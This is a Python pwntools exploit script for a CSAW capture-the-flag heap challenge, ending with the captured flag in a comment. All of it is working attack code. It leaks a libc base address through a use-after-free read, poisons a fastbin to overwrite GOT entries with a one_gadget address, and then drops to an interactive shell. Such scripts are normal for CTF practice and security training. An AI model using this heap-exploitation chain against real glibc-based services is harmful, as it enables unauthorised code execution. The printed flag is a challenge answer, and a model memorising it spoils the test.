#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('pwn.chal.csaw.io', 7713)
libc = ELF('libc-2.23.so')

def make(size, skill):
    r.sendlineafter('>>', '1')
    r.sendlineafter('>>', str(size))
    r.sendafter('>>', skill)

def destroy(index):
    r.sendlineafter('>>', '2')
    r.sendlineafter('>>', str(index))

def fix(index, size, skill):
    r.sendlineafter('>>', '3')
    r.sendlineafter('>>', str(index))
    r.sendlineafter('>>', str(size))
    r.sendafter('>>', skill)

def display(index):
    r.sendlineafter('>>', '4')
    r.sendlineafter('>>', str(index))

def go_home():
    r.sendlineafter('>>', '5')

# leak libc address
make(144-8, 'A'*4) # 0
make(144-8, 'B'*4) # 1
destroy(0)
display(0)
r.recvuntil('[*]SHOWING....\n')
libc_base = u64(r.recvn(6) + '\x00'*2) - 0x3c4b78
log.success('libc base: ' + hex(libc_base))
one_gadget = libc_base + 0xf0274 # constraint: [rsp+0x50] == NULL
destroy(1)

# fastbin corruption to make GOT hijack
# _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc -> one_gadget
make(96-8, 'C'*4) # 2
make(96-8, 'D'*4) # 3
destroy(3)
fix(2, 128, 'C'*80 + p64(0) + p64(0x61) + p64(0x605000-6))
make(96-8, 'E'*4) # 4
make(96-8, 'F'*6 + p64(libc_base+0x3e1870)
                 + p64(0x400910)
                 + p64(0x400920)
                 + p64(0x400930)
                 + p64(0x400940)
                 + p64(0x400950)
                 + p64(0x400960)
                 + p64(0x400970)
                 + p64(0x400980)
                 + p64(one_gadget)) # 5

r.interactive()

# flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
